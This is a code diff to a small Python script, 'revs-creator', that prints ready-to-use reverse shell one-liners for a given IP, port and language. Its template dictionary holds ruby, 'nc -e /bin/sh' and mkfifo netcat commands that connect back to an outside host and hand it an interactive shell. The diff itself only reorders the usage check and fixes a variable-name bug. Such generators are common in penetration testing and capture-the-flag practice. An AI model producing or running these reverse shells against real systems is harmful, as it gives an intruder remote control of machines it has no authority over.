@@ -1,14 +1,5 @@
 #!/usr/bin/python3 -u
-
-"""
-Usage: ./revs-creator 10.10.10.10 1234 bash 
-"""
-
 import sys
-
-if len(sys.argv) != 4:
-    print("Missing Arguments..")
-    quit()
 
 # Shell snippets
 shell_snippets = {}
@@ -21,10 +12,15 @@ shell_snippets["ruby"] = """ruby -rsocket -e'f=TCPSocket.open("__IP__",__PORT__)
 shell_snippets["netcat"] = """nc -e /bin/sh __IP__ __PORT__"""
 shell_snippets["netcat_alt"] = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc __IP__ __PORT__ >/tmp/f"""
 
+if len(sys.argv) != 4:
+    print("Usage: ./revs-creator 10.10.10.10 1234 bash")
+    print("Options:", ", ".join(shell_snippets.keys()))
+    quit()
+
 ip = sys.argv[1]
 port = sys.argv[2]
 shell = shell_snippets[sys.argv[3]]
 
-shell = lang.replace("__PORT__", port)
-shell = lang.replace("__IP__", ip)
-print(lang)
+shell = shell.replace("__PORT__", port)
+shell = shell.replace("__IP__", ip)
+print(shell)
